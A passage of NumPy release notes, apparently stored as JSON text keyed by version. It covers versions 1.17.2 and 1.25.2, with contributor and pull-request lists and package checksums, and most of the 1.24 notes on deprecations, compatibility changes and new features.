210461d87fb02a84ef243cac5e814aad2b7f4be953b32cb53327bb49fd77fbb4  numpy-1.24.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    784c6da1a07818491b0ffd63c6bbe5a33deaa0e25a20e1b3ea20cf0e43f8046c  numpy-1.24.3-cp39-cp39-win32.whl\n    d5036197ecae68d7f491fcdb4df90082b0d4960ca6599ba2659957aafced7c17  numpy-1.24.3-cp39-cp39-win_amd64.whl\n    352ee00c7f8387b44d19f4cada524586f07379c0d49270f87233983bc5087ca0  numpy-1.24.3-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    1a7d6acc2e7524c9955e5c903160aa4ea083736fde7e91276b0e5d98e6332812  numpy-1.24.3-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    35400e6a8d102fd07c71ed7dcadd9eb62ee9a6e84ec159bd48c28235bbb0f8e4  numpy-1.24.3-pp38-pypy38_pp73-win_amd64.whl\n    ab344f1bf21f140adab8e47fdbc7c35a477dc01408791f8ba00d018dd0bc5155  numpy-1.24.3.tar.gz\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA256\n\n.. currentmodule:: numpy\n\n==========================\n", "1.17.2": "==========================\n\nThis release contains fixes for bugs reported against NumPy 1.17.1 along with a\nsome documentation improvements. The most important fix is for lexsort when the\nkeys are of type (u)int8 or (u)int16. If you are currently using 1.17 you\nshould upgrade.\n\nThe Python versions supported in this release are 3.5-3.7, Python 2.7 has been\ndropped.  Python 3.8b4 should work with the released source packages, but there\nare no future guarantees.\n\nDownstream developers should use Cython >= 0.29.13 for Python 3.8 support and\nOpenBLAS >= 3.7 to avoid errors on the Skylake architecture. The NumPy wheels\non PyPI are built from the OpenBLAS development branch in order to avoid those\nerrors.\n\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* CakeWithSteak +\n* Charles Harris\n* Dan Allan\n* Hameer Abbasi\n* Lars Grueter\n* Matti Picus\n* Sebastian Berg\n\n\nPull requests merged\n====================\n\nA total of 8 pull requests were merged for this release.\n\n* `14418 <https://github.com/numpy/numpy/pull/14418>`__: BUG: Fix aradixsort indirect indexing.\n* `14420 <https://github.com/numpy/numpy/pull/14420>`__: DOC: Fix a minor typo in dispatch documentation.\n* `14421 <https://github.com/numpy/numpy/pull/14421>`__: BUG: test, fix regression in converting to ctypes\n* `14430 <https://github.com/numpy/numpy/pull/14430>`__: BUG: Do not show Override module in private error classes.\n* `14432 <https://github.com/numpy/numpy/pull/14432>`__: BUG: Fixed maximum relative error reporting in assert_allclose.\n* `14433 <https://github.com/numpy/numpy/pull/14433>`__: BUG: Fix uint-overflow if padding with linear_ramp and negative...\n* `14436 <https://github.com/numpy/numpy/pull/14436>`__: BUG: Update 1.17.x with 1.18.0-dev pocketfft.py.\n* `14446 <https://github.com/numpy/numpy/pull/14446>`__: REL: Prepare for NumPy 1.17.2 release.\n\nChecksums\n=========\n\nMD5\n- ---\n\n    900786591ffe811ff9ff8b3fcf9e3ff9  numpy-1.17.2-cp35-cp35m-macosx_10_6_intel.whl\n    307df8c629637865205276f0e48cbe53  numpy-1.17.2-cp35-cp35m-manylinux1_i686.whl\n    279b286a569bacba85dfe44d86ed9767  numpy-1.17.2-cp35-cp35m-manylinux1_x86_64.whl\n    0bc93e932b32408cceb5579f074e30a9  numpy-1.17.2-cp35-cp35m-win32.whl\n    b963be3cae47b66b2c8b433d34cb93d1  numpy-1.17.2-cp35-cp35m-win_amd64.whl\n    3eed381285a43bd23d7c568c6c165ec9  numpy-1.17.2-cp36-cp36m-macosx_10_6_intel.whl\n    0a6d7616b5ed35d65a58c6a61256afb0  numpy-1.17.2-cp36-cp36m-manylinux1_i686.whl\n    5b5a2f0bc6f01c1ae2c831fbfd8c8b06  numpy-1.17.2-cp36-cp36m-manylinux1_x86_64.whl\n    8f166ccebf19a8c9c6ac00c8d93ba566  numpy-1.17.2-cp36-cp36m-win32.whl\n    406fc90887f6af60f2edf229b2cfb2cf  numpy-1.17.2-cp36-cp36m-win_amd64.whl\n    a82da3fd77787c73cae9057f63e3b666  numpy-1.17.2-cp37-cp37m-macosx_10_6_intel.whl\n    1f9b449eca275014f133872cdddf166d  numpy-1.17.2-cp37-cp37m-manylinux1_i686.whl\n    1de9df1e07a1f2becc7925b0861d1b2d  numpy-1.17.2-cp37-cp37m-manylinux1_x86_64.whl\n    0ae4a060c7353723c340aaf0fc655220  numpy-1.17.2-cp37-cp37m-win32.whl\n    a7a026ef5c54dbc295e134d04367514e  numpy-1.17.2-cp37-cp37m-win_amd64.whl\n    68d582e09b951717b7ae1e9c0011d779  numpy-1.17.2.tar.gz\n    a0fffd7651e6ed4c60d94394ca6662cd  numpy-1.17.2.zip\n\nSHA256\n- ------\n\n    3d0b0989dd2d066db006158de7220802899a1e5c8cf622abe2d0bd158fd01c2c  numpy-1.17.2-cp35-cp35m-macosx_10_6_intel.whl\n    7bd355ad7496f4ce1d235e9814ec81ee3d28308d591c067ce92e49f745ba2c2f  numpy-1.17.2-cp35-cp35m-manylinux1_i686.whl\n    7d077f2976b8f3de08a0dcf5d72083f4af5411e8fddacd662aae27baa2601196  numpy-1.17.2-cp35-cp35m-manylinux1_x86_64.whl\n    05dbfe72684cc14b92568de1bc1f41e5f62b00f714afc9adee42f6311738091f  numpy-1.17.2-cp35-cp35m-win32.whl\n    f4a4f6aba148858a5a5d546a99280f71f5ee6ec8182a7d195af1a914195b21a2  numpy-1.17.2-cp35-cp35m-win_amd64.whl\n    ee8e9d7cad5fe6dde50ede0d2e978d81eafeaa6233fb0b8719f60214cf226578  numpy-1.17.2-cp36-cp36m-macosx_10_6_intel.whl\n    438a3f0e7b681642898fd7993d38e2bf140a2d1eafaf3e89bb626db7f50db355  numpy-1.17.2-cp36-cp36m-manylinux1_i686.whl\n    b458de8624c9f6034af492372eb2fee41a8e605f03f4732f43fc099e227858b2  numpy-1.17.2-cp36-cp36m-manylinux1_x86_64.whl\n    0d82cb7271a577529d07bbb05cb58675f2deb09772175fab96dc8de025d8ac05  numpy-1.17.2-cp36-cp36m-win32.whl\n    12322df2e21f033a60c80319c25011194cd2a21294cc66fee0908aeae2c27832  numpy-1.17.2-cp36-cp36m-win_amd64.whl\n    e70fc8ff03a961f13363c2c95ef8285e0cf6a720f8271836f852cc0fa64e97c8  numpy-1.17.2-cp37-cp37m-macosx_10_6_intel.whl\n    a4092682778dc48093e8bda8d26ee8360153e2047826f95a3f5eae09f0ae3abf  numpy-1.17.2-cp37-cp37m-manylinux1_i686.whl\n    10132aa1fef99adc85a905d82e8497a580f83739837d7cbd234649f2e9b9dc58  numpy-1.17.2-cp37-cp37m-manylinux1_x86_64.whl\n    16f19b3aa775dddc9814e02a46b8e6ae6a54ed8cf143962b4e53f0471dbd7b16  numpy-1.17.2-cp37-cp37m-win32.whl\n    5fd214f482ab53f2cea57414c5fb3e58895b17df6e6f5bca5be6a0bb6aea23bb  numpy-1.17.2-cp37-cp37m-win_amd64.whl\n    81a4f748dcfa80a7071ad8f3d9f8edb9f8bc1f0a9bdd19bfd44fd42c02bd286c  numpy-1.17.2.tar.gz\n    73615d3edc84dd7c4aeb212fa3748fb83217e00d201875a47327f55363cef2df  numpy-1.17.2.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEzBAEBCAAdFiEEU6DlKD8F4p1xKRSeZ58ig3fFJHsFAl1y8L8ACgkQZ58ig3fF\nJHvbiggAjZShImtAtP00Hs8RAbjB+1u4r291DxIQciorQcBEhAvOtc2Z5dpxTYtj\nqDeRIMGxLzsBF6+E6ksbQVc5oe3VsSCQ5qUegrx0KvDTrQ7cRnxnMatYY6/p3tDD\nXKDF0+YO8BaMNL3p67n1SCNIRLvBgyku+uhHtTKpJlzLEsloPkfEjrt9deuQ/SQE\nzOJfz0VBlJLhcmbjMFTAY8u8YOBFAfTjJGjLbVphMnpuAsZeUN2W9k/urSkgGb3i\nhaTDkFeERKZ7d8a+EMkeIip9qhFb0RjeiTVDmKkHHz3yu9ZJv8hK2H0vKcdJ/WyP\n12RQXwQLsxyCC3DvFmEklJJki+Yzrg==\n=GEO2\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.25.2": "==========================\nNumPy 1.25.2 is a maintenance release that fixes bugs and regressions\ndiscovered after the 1.25.1 release. This is the last planned release in the\n1.25.x series, the next release will be 1.26.0, which will use the meson build\nsystem and support Python 3.12. The Python versions supported by this release\nare 3.9-3.11.\n\nContributors\n============\n\nA total of 13 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Aaron Meurer\n* Andrew Nelson\n* Charles Harris\n* Kevin Sheppard\n* Matti Picus\n* Nathan Goldbaum\n* Peter Hawkins\n* Ralf Gommers\n* Randy Eckenrode +\n* Sam James +\n* Sebastian Berg\n* Tyler Reddy\n* dependabot[bot]\n\nPull requests merged\n====================\n\nA total of 19 pull requests were merged for this release.\n\n* `24148 <https://github.com/numpy/numpy/pull/24148>`__: MAINT: prepare 1.25.x for further development\n* `24174 <https://github.com/numpy/numpy/pull/24174>`__: ENH: Improve clang-cl compliance\n* `24179 <https://github.com/numpy/numpy/pull/24179>`__: MAINT: Upgrade various build dependencies.\n* `24182 <https://github.com/numpy/numpy/pull/24182>`__: BLD: use ``-ftrapping-math`` with Clang on macOS\n* `24183 <https://github.com/numpy/numpy/pull/24183>`__: BUG: properly handle negative indexes in ufunc_at fast path\n* `24184 <https://github.com/numpy/numpy/pull/24184>`__: BUG: PyObject_IsTrue and PyObject_Not error handling in setflags\n* `24185 <https://github.com/numpy/numpy/pull/24185>`__: BUG: histogram small range robust\n* `24186 <https://github.com/numpy/numpy/pull/24186>`__: MAINT: Update meson.build files from main branch\n* `24234 <https://github.com/numpy/numpy/pull/24234>`__: MAINT: exclude min, max and round from ``np.__all__``\n* `24241 <https://github.com/numpy/numpy/pull/24241>`__: MAINT: Dependabot updates\n* `24242 <https://github.com/numpy/numpy/pull/24242>`__: BUG: Fix the signature for np.array_api.take\n* `24243 <https://github.com/numpy/numpy/pull/24243>`__: BLD: update OpenBLAS to an intermeidate commit\n* `24244 <https://github.com/numpy/numpy/pull/24244>`__: BUG: Fix reference count leak in str(scalar).\n* `24245 <https://github.com/numpy/numpy/pull/24245>`__: BUG: fix invalid function pointer conversion error\n* `24255 <https://github.com/numpy/numpy/pull/24255>`__: BUG: Factor out slow ``getenv`` call used for memory policy warning\n* `24292 <https://github.com/numpy/numpy/pull/24292>`__: CI: correct URL in cirrus.star [skip cirrus]\n* `24293 <https://github.com/numpy/numpy/pull/24293>`__: BUG: Fix C types in scalartypes\n* `24294 <https://github.com/numpy/numpy/pull/24294>`__: BUG: do not modify the input to ufunc_at\n* `24295 <https://github.com/numpy/numpy/pull/24295>`__: BUG: Further fixes to indexing loop and added tests\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    33518ccb4da8ee11f1dee4b9fef1e468  numpy-1.25.2-cp310-cp310-macosx_10_9_x86_64.whl\n    b5cb0c3b33ef6d93ec2888f25b065636  numpy-1.25.2-cp310-cp310-macosx_11_0_arm64.whl\n    ae027dd38bd73f09c07220b2f516f148  numpy-1.25.2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    88cf69dc3c0d293492c4c7e75dccf3d8  numpy-1.25.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    3e4e3ad02375ba71ae2cd05ccd97aba4  numpy-1.25.2-cp310-cp310-musllinux_1_1_x86_64.whl\n    f52bb644682deb26c35ddec77198b65c  numpy-1.25.2-cp310-cp310-win32.whl\n    4944cf36652be7560a6bcd0d5d56e8ea  numpy-1.25.2-cp310-cp310-win_amd64.whl\n    5a56e639defebb7b871c8c5613960ca3  numpy-1.25.2-cp311-cp311-macosx_10_9_x86_64.whl\n    3988b96944e7218e629255214f2598bd  numpy-1.25.2-cp311-cp311-macosx_11_0_arm64.whl\n    302d65015ddd908a862fb3761a2a0363  numpy-1.25.2-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    e54a2e23272d1c5e5b278bd7e304c948  numpy-1.25.2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    961d390e8ccaf11b1b0d6200d2c8b1c0  numpy-1.25.2-cp311-cp311-musllinux_1_1_x86_64.whl\n    e113865b90f97079d344100c41226fbe  numpy-1.25.2-cp311-cp311-win32.whl\n    834a147aa1adaec97655018b882232bd  numpy-1.25.2-cp311-cp311-win_amd64.whl\n    fb55f93a8033bde854c8a2b994045686  numpy-1.25.2-cp39-cp39-macosx_10_9_x86_64.whl\n    d96e754217d29bf045e082b695667e62  numpy-1.25.2-cp39-cp39-macosx_11_0_arm64.whl\n    beab540edebecbb257e482dd9e498b44  numpy-1.25.2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    e0d608c9e09cd8feba48567586cfefc0  numpy-1.25.2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    fe1fc32c8bb005ca04b8f10ebdcff6dd  numpy-1.25.2-cp39-cp39-musllinux_1_1_x86_64.whl\n    41df58a9935c8ed869c92307c95f02eb  numpy-1.25.2-cp39-cp39-win32.whl\n    a4371272c64493beb8b04ac46c4c1521  numpy-1.25.2-cp39-cp39-win_amd64.whl\n    bbe051cbd5f8661dd054277f0b0f0c3d  numpy-1.25.2-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    3f68e6b4af6922989dc0133e37db34ee  numpy-1.25.2-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    fc89421b79e8800240999d3a1d06a4d2  numpy-1.25.2-pp39-pypy39_pp73-win_amd64.whl\n    cee1996a80032d47bdf1d9d17249c34e  numpy-1.25.2.tar.gz\n\nSHA256\n------\n::\n\n    db3ccc4e37a6873045580d413fe79b68e47a681af8db2e046f1dacfa11f86eb3  numpy-1.25.2-cp310-cp310-macosx_10_9_x86_64.whl\n    90319e4f002795ccfc9050110bbbaa16c944b1c37c0baeea43c5fb881693ae1f  numpy-1.25.2-cp310-cp310-macosx_11_0_arm64.whl\n    dfe4a913e29b418d096e696ddd422d8a5d13ffba4ea91f9f60440a3b759b0187  numpy-1.25.2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    f08f2e037bba04e707eebf4bc934f1972a315c883a9e0ebfa8a7756eabf9e357  numpy-1.25.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    bec1e7213c7cb00d67093247f8c4db156fd03075f49876957dca4711306d39c9  numpy-1.25.2-cp310-cp310-musllinux_1_1_x86_64.whl\n    7dc869c0c75988e1c693d0e2d5b26034644399dd929bc049db55395b1379e044  numpy-1.25.2-cp310-cp310-win32.whl\n    834b386f2b8210dca38c71a6e0f4fd6922f7d3fcff935dbe3a570945acb1b545  numpy-1.25.2-cp310-cp310-win_amd64.whl\n    c5462d19336db4560041517dbb7759c21d181a67cb01b36ca109b2ae37d32418  numpy-1.25.2-cp311-cp311-macosx_10_9_x86_64.whl\n    c5652ea24d33585ea39eb6a6a15dac87a1206a692719ff45d53c5282e66d4a8f  numpy-1.25.2-cp311-cp311-macosx_11_0_arm64.whl\n    0d60fbae8e0019865fc4784745814cff1c421df5afee233db6d88ab4f14655a2  numpy-1.25.2-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    60e7f0f7f6d0eee8364b9a6304c2845b9c491ac706048c7e8cf47b83123b8dbf  numpy-1.25.2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    bb33d5a1cf360304754913a350edda36d5b8c5331a8237268c48f91253c3a364  numpy-1.25.2-cp311-cp311-musllinux_1_1_x86_64.whl\n    5883c06bb92f2e6c8181df7b39971a5fb436288db58b5a1c3967702d4278691d  numpy-1.25.2-cp311-cp311-win32.whl\n    5c97325a0ba6f9d041feb9390924614b60b99209a71a69c876f71052521d42a4  numpy-1.25.2-cp311-cp311-win_amd64.whl\n    b79e513d7aac42ae918db3ad1341a015488530d0bb2a6abcbdd10a3a829ccfd3  numpy-1.25.2-cp39-cp39-macosx_10_9_x86_64.whl\n    eb942bfb6f84df5ce05dbf4b46673ffed0d3da59f13635ea9b926af3deb76926  numpy-1.25.2-cp39-cp39-macosx_11_0_arm64.whl\n    3e0746410e73384e70d286f93abf2520035250aad8c5714240b0492a7302fdca  numpy-1.25.2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    d7806500e4f5bdd04095e849265e55de20d8cc4b661b038957354327f6d9b295  numpy-1.25.2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    8b77775f4b7df768967a7c8b3567e309f617dd5e99aeb886fa14dc1a0791141f  numpy-1.25.2-cp39-cp39-musllinux_1_1_x86_64.whl\n    2792d23d62ec51e50ce4d4b7d73de8f67a2fd3ea710dcbc8563a51a03fb07b01  numpy-1.25.2-cp39-cp39-win32.whl\n    76b4115d42a7dfc5d485d358728cdd8719be33cc5ec6ec08632a5d6fca2ed380  numpy-1.25.2-cp39-cp39-win_amd64.whl\n    1a1329e26f46230bf77b02cc19e900db9b52f398d6722ca853349a782d4cff55  numpy-1.25.2-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    4c3abc71e8b6edba80a01a52e66d83c5d14433cbcd26a40c329ec7ed09f37901  numpy-1.25.2-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    1b9735c27cea5d995496f46a8b1cd7b408b3f34b6d50459d9ac8fe3a20cc17bf  numpy-1.25.2-pp39-pypy39_pp73-win_amd64.whl\n    fd608e19c8d7c55021dffd43bfe5492fab8cc105cc8986f813f8c3c048b38760  numpy-1.25.2.tar.gz\n\n\n.. currentmodule:: numpy\n\n========================\nNumPy 1.24 Release Notes\n========================\nThe NumPy 1.24.0 release continues the ongoing work to improve the handling and\npromotion of dtypes, increase the execution speed, and clarify the\ndocumentation.  There are also a large number of new and expired deprecations\ndue to changes in promotion and cleanups. This might be called a deprecation\nrelease. Highlights are\n\n* Many new deprecations, check them out.\n* Many expired deprecations,\n* New F2PY features and fixes.\n* New \"dtype\" and \"casting\" keywords for stacking functions.\n\nSee below for the details,\n\n\nDeprecations\n============\n\nDeprecate fastCopyAndTranspose and PyArray_CopyAndTranspose\n-----------------------------------------------------------\nThe ``numpy.fastCopyAndTranspose`` function has been deprecated. Use the\ncorresponding copy and transpose methods directly::\n\n    arr.T.copy()\n\nThe underlying C function ``PyArray_CopyAndTranspose`` has also been deprecated\nfrom the NumPy C-API.\n\n(`gh-22313 <https://github.com/numpy/numpy/pull/22313>`__)\n\nConversion of out-of-bound Python integers\n------------------------------------------\nAttempting a conversion from a Python integer to a NumPy value will now always\ncheck whether the result can be represented by NumPy.  This means the following\nexamples will fail in the future and give a ``DeprecationWarning`` now::\n\n    np.uint8(-1)\n    np.array([3000], dtype=np.int8)\n\nMany of these did succeed before.  Such code was mainly useful for unsigned\nintegers with negative values such as ``np.uint8(-1)`` giving\n``np.iinfo(np.uint8).max``.\n\nNote that conversion between NumPy integers is unaffected, so that\n``np.array(-1).astype(np.uint8)`` continues to work and use C integer overflow\nlogic.\n\n(`gh-22393 <https://github.com/numpy/numpy/pull/22393>`__)\n\nDeprecate ``msort``\n-------------------\nThe ``numpy.msort`` function is deprecated. Use ``np.sort(a, axis=0)`` instead.\n\n(`gh-22456 <https://github.com/numpy/numpy/pull/22456>`__)\n\n``np.str0`` and similar are now deprecated\n------------------------------------------\nThe scalar type aliases ending in a 0 bit size: ``np.object0``, ``np.str0``,\n``np.bytes0``, ``np.void0``, ``np.int0``, ``np.uint0`` as well as ``np.bool8``\nare now deprecated and will eventually be removed.\n\n(`gh-22607 <https://github.com/numpy/numpy/pull/22607>`__)\n\n\nExpired deprecations\n====================\n\n* The ``normed`` keyword argument has been removed from\n  `np.histogram`, `np.histogram2d`, and `np.histogramdd`.\n  Use ``density`` instead.  If ``normed`` was passed by\n  position, ``density`` is now used.\n\n  (`gh-21645 <https://github.com/numpy/numpy/pull/21645>`__)\n\n* Ragged array creation will now always raise a ``ValueError`` unless\n  ``dtype=object`` is passed.  This includes very deeply nested sequences.\n\n  (`gh-22004 <https://github.com/numpy/numpy/pull/22004>`__)\n\n* Support for Visual Studio 2015 and earlier has been removed.\n\n* Support for the Windows Interix POSIX interop layer has been removed.\n\n  (`gh-22139 <https://github.com/numpy/numpy/pull/22139>`__)\n\n* Support for cygwin < 3.3 has been removed.\n\n  (`gh-22159 <https://github.com/numpy/numpy/pull/22159>`__)\n\n* The mini() method of ``np.ma.MaskedArray`` has been removed. Use either\n  ``np.ma.MaskedArray.min()`` or ``np.ma.minimum.reduce()``.\n\n* The single-argument form of ``np.ma.minimum`` and ``np.ma.maximum`` has been\n  removed. Use ``np.ma.minimum.reduce()`` or ``np.ma.maximum.reduce()``\n  instead.\n\n  (`gh-22228 <https://github.com/numpy/numpy/pull/22228>`__)\n\n* Passing dtype instances other than the canonical (mainly native byte-order)\n  ones to ``dtype=`` or ``signature=`` in ufuncs will now raise a\n  ``TypeError``.  We recommend passing the strings ``\"int8\"`` or scalar types\n  ``np.int8`` since the byte-order, datetime/timedelta unit, etc. are never\n  enforced.  (Initially deprecated in NumPy 1.21.)\n\n  (`gh-22540 <https://github.com/numpy/numpy/pull/22540>`__)\n\n* The ``dtype=`` argument to comparison ufuncs is now applied correctly.  That\n  means that only ``bool`` and ``object`` are valid values and ``dtype=object``\n  is enforced.\n\n  (`gh-22541 <https://github.com/numpy/numpy/pull/22541>`__)\n\n* The deprecation for the aliases ``np.object``, ``np.bool``, ``np.float``,\n  ``np.complex``, ``np.str``, and ``np.int`` is expired (introduces NumPy\n  1.20).  Some of these will now give a FutureWarning in addition to raising an\n  error since they will be mapped to the NumPy scalars in the future.\n\n  (`gh-22607 <https://github.com/numpy/numpy/pull/22607>`__)\n\n\nCompatibility notes\n===================\n\n``array.fill(scalar)`` may behave slightly different\n----------------------------------------------------\n``numpy.ndarray.fill`` may in some cases behave slightly different now due to\nthe fact that the logic is aligned with item assignment::\n\n    arr = np.array([1])   with any dtype/value\n    arr.fill(scalar)\n     is now identical to:\n    arr[0] = scalar\n\nPreviously casting may have produced slightly different answers when using\nvalues that could not be represented in the target ``dtype`` or when the target\nhad ``object`` dtype.\n\n(`gh-20924 <https://github.com/numpy/numpy/pull/20924>`__)\n\nSubarray to object cast now copies\n----------------------------------\nCasting a dtype that includes a subarray to an object will now ensure a copy of\nthe subarray.  Previously an unsafe view was returned::\n\n    arr = np.ones(3, dtype=[(\"f\", \"i\", 3)])\n    subarray_fields = arr.astype(object)[0]\n    subarray = subarray_fields[0]   \"f\" field\n\n    np.may_share_memory(subarray, arr)\n\nIs now always false.  While previously it was true for the specific cast.\n\n(`gh-21925 <https://github.com/numpy/numpy/pull/21925>`__)\n\nReturned arrays respect uniqueness of dtype kwarg objects\n---------------------------------------------------------\nWhen the ``dtype`` keyword argument is used with :py:func:`np.array()` or\n:py:func:`asarray()`, the dtype of the returned array now always exactly\nmatches the dtype provided by the caller.\n\nIn some cases this change means that a *view* rather than the input array is\nreturned.  The following is an example for this on 64bit Linux where ``long``\nand ``longlong`` are the same precision but different ``dtypes``::\n\n    >>> arr = np.array([1, 2, 3], dtype=\"long\")\n    >>> new_dtype = np.dtype(\"longlong\")\n    >>> new = np.asarray(arr, dtype=new_dtype)\n    >>> new.dtype is new_dtype\n    True\n    >>> new is arr\n    False\n\nBefore the change, the ``dtype`` did not match because ``new is arr`` was\n``True``.\n\n(`gh-21995 <https://github.com/numpy/numpy/pull/21995>`__)\n\nDLPack export raises ``BufferError``\n------------------------------------\nWhen an array buffer cannot be exported via DLPack a ``BufferError`` is now\nalways raised where previously ``TypeError`` or ``RuntimeError`` was raised.\nThis allows falling back to the buffer protocol or ``__array_interface__`` when\nDLPack was tried first.\n\n(`gh-22542 <https://github.com/numpy/numpy/pull/22542>`__)\n\nNumPy builds are no longer tested on GCC-6\n------------------------------------------\nUbuntu 18.04 is deprecated for GitHub actions and GCC-6 is not available on\nUbuntu 20.04, so builds using that compiler are no longer tested. We still test\nbuilds using GCC-7 and GCC-8.\n\n(`gh-22598 <https://github.com/numpy/numpy/pull/22598>`__)\n\n\nNew Features\n============\n\nNew attribute ``symbol`` added to polynomial classes\n----------------------------------------------------\nThe polynomial classes in the ``numpy.polynomial`` package have a new\n``symbol`` attribute which is used to represent the indeterminate of the\npolynomial.  This can be used to change the value of the variable when\nprinting::\n\n    >>> P_y = np.polynomial.Polynomial([1, 0, -1], symbol=\"y\")\n    >>> print(P_y)\n    1.0 + 0.0\u00b7y\u00b9 - 1.0\u00b7y\u00b2\n\nNote that the polynomial classes only support 1D polynomials, so operations\nthat involve polynomials with different symbols are disallowed when the result\nwould be multivariate::\n\n    >>> P = np.polynomial.Polynomial([1, -1])   default symbol is \"x\"\n    >>> P_z = np.polynomial.Polynomial([1, 1], symbol=\"z\")\n    >>> P * P_z\n    Traceback (most recent call last)\n       ...\n    ValueError: Polynomial symbols differ\n\nThe symbol can be any valid Python identifier. The default is ``symbol=x``,\nconsistent with existing behavior.\n\n(`gh-16154 <https://github.com/numpy/numpy/pull/16154>`__)\n\nF2PY support for Fortran ``character`` strings\n----------------------------------------------\nF2PY now supports wrapping Fortran functions with:\n\n* character (e.g. ``character x``)\n* character array (e.g. ``character, dimension(n) :: x``)\n* character string (e.g. ``character(len=10) x``)\n* and character string array (e.g. ``character(len=10), dimension(n, m) :: x``)\n\narguments, including passing Python unicode strings as Fortran character string\narguments.\n\n(`gh-19388 <https://github.com/numpy/numpy/pull/19388>`__)\n\nNew function ``np.show_runtime``\n--------------------------------\nA new function ``numpy.show_runtime`` has been added to display the runtime\ninformation of the machine in addition to ``numpy.show_config`` which displays\nthe build-related information.\n\n(`gh-21468 <https://github.com/numpy/numpy/pull/21468>`__)\n\n``strict`` option for ``testing.assert_array_equal``\n----------------------------------------------------\nThe ``strict`` option is now available for ``testing.assert_array_equal``.\nSetting ``strict=True`` will disable the broadcasting behaviour for scalars and\nensure that input arrays have the same data type.\n\n(`gh-21595 <https://github.com/numpy/numpy/pull/21595>`__)\n\nNew parameter ``equal_nan`` added to ``np.unique``\n--------------------------------------------------\n``np.unique`` was changed in 1.21 to treat all ``NaN`` values as equal and\nreturn a single ``NaN``. Setting ``equal_nan=False`` will restore pre-1.21\nbehavior to treat ``NaNs`` as unique. Defaults to ``True``.\n\n(`gh-21623 <https://github.com/numpy/numpy/pull/21623>`__)\n\n``casting`` and ``dtype`` keyword arguments for ``numpy.stack``\n---------------------------------------------------------------\nThe ``casting`` and ``dtype`` keyword arguments are now available for\n``numpy.stack``.  To use them, write ``np.stack(..., dtype=None,\ncasting='same_kind')``.\n\n``casting`` and ``dtype`` keyword arguments for ``numpy.vstack``\n----------------------------------------------------------------\nThe ``casting`` and ``dtype`` keyword arguments are now available for\n``numpy.vstack``.  To use them, write ``np.vstack(..., dtype=None,\ncasting='same_kind')``.\n\n``casting`` and ``dtype`` keyword arguments for ``numpy.hstack``\n----------------------------------------------------------------\nThe ``casting`` and ``dtype`` keyword arguments are now available for\n``numpy.hstack``.  To use them, write ``np.hstack(..., dtype=None,\ncasting='same_kind')``.\n\n(`gh-21627 <https://github.com/numpy/numpy/pull/21627>`__)\n\nThe bit generator underlying the singleton RandomState can be changed\n---------------------------------------------------------------------\nThe singleton ``RandomState`` instance exposed in the ``numpy.random`` module\nis initialized at startup with the ``MT19937`` bit generator. The new function\n``set_bit_generator`` allows the default bit generator to be replaced with a\nuser-provided bit generator. This function has been introduced to provide a\nmethod allowing seamless integration of a high-quality, modern bit generator in\nnew code with existing code that makes use of the singleton-provided random\nvariate generating functions. The companion function ``get_bit_generator``\nreturns the current bit generator being used by the singleton ``RandomState``.\nThis is provided to simplify restoring the original source of randomness if\nrequired.\n\nThe preferred method to generate reproducible random numbers is to use a modern\nbit generator in an instance of ``Generator``. The function ``default_rng``\nsimplifies instantiation::\n\n   >>> rg = np.random.default_rng(3728973198)\n   >>> rg.random()\n\nThe same bit generator can then be shared with the singleton instance so that\ncalling functions in the ``random`` module will use the same bit generator::\n\n   >>> orig_bit_gen = np.random.get_bit_generator()\n   >>> np.random.set_bit_generator(rg.bit_generator)\n   >>> np.random.normal()\n\nThe swap is permanent (until reversed) and so any call to functions in the\n``random`` module will use the new bit generator. The original can be restored\nif required for code to run correctly::\n\n   >>> np.random.set_bit_generator(orig_bit_gen)\n\n(`gh-21976 <https://github.com/numpy/numpy/pull/21976>`__)\n\n``np.void`` now has a ``dtype`` argument\n----------------------------------------\nNumPy now allows constructing structured void scalars directly by\npassing the ``dtype`` argument to ``np.void``.\n\n(`gh-22316 <https://github.com/numpy/numpy/pull/22316>`__)\n\n\nImprovements\n============\n\nF2PY Improvements\n-----------------\n* The generated extension modules don't use the deprecated NumPy-C API anymore\n* Improved ``f2py`` generated exception messages\n* Numerous bug and ``flake8`` warning fixes\n* various CPP macros that one can use within C-expressions of signature files\n  are prefixed with ``f2py_``. For example, one should use ``f2py_len(x)``\n  instead of ``len(x)``\n* A new construct ``character(f2py_len=...)`` is introduced to support\n  returning assumed length character strings (e.g. ``character(len=*)``) from\n  wrapper functions\n\nA hook to support rewriting ``f2py`` internal data structures after reading all\nits input files is introduced. This is required, for instance, for BC of SciPy\nsupport where character arguments are treated as character strings arguments in\n``C`` expressions.\n\n(`gh-19388 <https://github.com/numpy/numpy/pull/19388>`__)\n\nIBM zSystems Vector Extension Facility (SIMD)\n---------------------------------------------\nAdded support for SIMD extensions of zSystem (z13, z14, z15), through the\nuniversal 